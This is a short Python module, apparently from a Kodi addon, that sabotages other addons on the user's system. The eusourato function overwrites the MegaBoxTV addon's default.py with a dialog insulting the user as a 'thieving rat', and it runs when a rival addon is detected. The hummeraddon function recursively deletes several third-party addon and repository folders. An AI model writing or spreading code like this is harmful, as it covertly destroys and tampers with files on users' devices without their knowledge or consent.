import xbmc
import os
import shutil

    

def eusourato():
    con = os.path.join(xbmc.translatePath("special://home/addons/plugin.video.MegaBoxTV/default.py").decode("utf-8"))
    arq2 = open(con, 'w')
    arq2.write("\n import xbmcgui")
    arq2.write("\n dialog = xbmcgui.Dialog()")
    arq2.write("\n d = dialog.input('[COLOR yellow]Digite 0 Para dizer sou Rato Ladrao[/COLOR]', type=xbmcgui.INPUT_ALPHANUM)")
    arq2.write("\n key = int(""+d+"")")


def checkrato():
    con = os.path.join(xbmc.translatePath("special://home/addons/plugin.video.blurayplays/default.py").decode("utf-8"))
    if os.path.exists(con):
        eusourato()

def hummeraddon():
    for a in ['special://home/addons/plugin.video.MegaBoxTV','special://home/addons/plugin.video.MegaBoxTV+18','special://home/addons/megabox.repo.kodi','special://home/addons/plugin.video.blurayplays']:
        existe = xbmc.translatePath(a)
	if os.path.exists(existe)==True:
		shutil.rmtree(existe)

        
        
